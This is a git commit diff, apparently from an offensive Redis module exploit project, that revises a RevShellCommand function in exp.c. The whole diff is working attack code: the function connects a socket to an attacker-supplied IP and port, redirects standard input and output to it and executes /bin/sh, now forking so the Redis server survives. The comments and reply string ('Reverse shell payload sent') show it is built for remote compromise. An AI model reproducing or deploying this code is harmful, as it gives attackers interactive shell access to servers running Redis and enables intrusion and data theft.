0ddf7afb134a81089450671395e1ccee2341468e
Robin Rhee <robin.rhee.jx@gmail.com>
2026-04-08 22:56:35 +0800

    fix reverse shell command

--- RedisModulesSDK/exp/exp.c
+++ RedisModulesSDK/exp/exp.c
@@ -36,28 +36,43 @@ int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
 }
 
 int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
-	if (argc == 3) {
-		size_t cmd_len;
-		char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
-		char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
-		int port = atoi(port_s);
-		int s;
+    if (argc == 3) {
+        size_t cmd_len;
+        char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
+        char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
+        int port = atoi(port_s);
 
-		struct sockaddr_in sa;
-		sa.sin_family = AF_INET;
-		sa.sin_addr.s_addr = inet_addr(ip);
-		sa.sin_port = htons(port);
-		
-		s = socket(AF_INET, SOCK_STREAM, 0);
-		connect(s, (struct sockaddr *)&sa, sizeof(sa));
-		dup2(s, 0);
-		dup2(s, 1);
-		dup2(s, 2);
+        // Fork to avoid killing Redis
+		// It will exit when you close the netcat connection
+        if (fork() == 0) {
+            // Child process
+            int s;
+            struct sockaddr_in sa;
+            sa.sin_family = AF_INET;
+            sa.sin_addr.s_addr = inet_addr(ip);
+            sa.sin_port = htons(port);
 
-		execve("/bin/sh", 0, 0);
-	} else {
-                return RedisModule_WrongArity(ctx);
+            s = socket(AF_INET, SOCK_STREAM, 0);
+            if (s < 0) return REDISMODULE_ERR;
+            if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) return REDISMODULE_ERR;
+
+            dup2(s, 0);
+            dup2(s, 1);
+            dup2(s, 2);
+			// new file descriptors stdio (0, 1, 2) point to the same underlying socket
+			// If you do not close s, the child process will keep it open for its entire lifetime
+            close(s);
+
+            char *args[] = {"/bin/sh", NULL};
+            // if succeed, block the child process
+			execve("/bin/sh", args, NULL);
+			// if fail, exit
+            exit(0);  
         }
+        RedisModule_ReplyWithSimpleString(ctx, "Reverse shell payload sent");
+    } else {
+        return RedisModule_WrongArity(ctx);
+    }
     return REDISMODULE_OK;
 }
 
